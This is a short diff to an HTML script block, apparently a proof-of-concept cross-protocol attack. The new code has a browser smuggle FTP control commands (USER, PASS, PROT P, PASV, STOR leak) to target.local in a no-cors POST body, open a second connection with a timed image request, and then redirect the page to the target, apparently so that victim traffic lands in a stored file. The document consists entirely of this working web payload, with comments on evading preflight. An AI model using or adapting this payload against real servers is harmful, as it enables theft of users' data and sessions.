@@ -1,16 +1,28 @@
 <script>
-    var formData = new FormData();
-    formData.append("a", "USER bob");
-    formData.append("b", "PASS 12345");
-    formData.append("b", "TYPE I");
-    formData.append("c", "PASV");
-    formData.append("d", "STOR leak");
+  const payload =
+    'USER bob\r\n' +
+    'PASS 12345\r\n' +
+    'TYPE I\r\n' +
+    'PBSZ 0\r\n' + 
+    'PROT P\r\n' +
+    'PASV\r\n' +
+    'STOR leak\r\n';
 
-    var xhr = new XMLHttpRequest();
-    xhr.open("POST", "https://target.com");
-    xhr.send(formData);
+  // Body testuale sul canale di controllo (no-cors per evitare preflight)
+  fetch('https://target.local', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: payload
+  }).catch(() => {});
 
-    setTimeout(function() {
-        window.location = "https://target.com";
-    }, 5000);
+  // After a few seconds, create a NEW TCP connection to target.local
+  // using an image resource (this tends to open a new socket if the POST one is busy)
+  setTimeout(() => {
+    const img = new Image();
+    img.src = 'https://target.local/?t=' + Date.now();
+  }, 7000);
+
+  setTimeout(() => {
+    window.location = 'https://target.local';
+  }, 9000);
 </script>
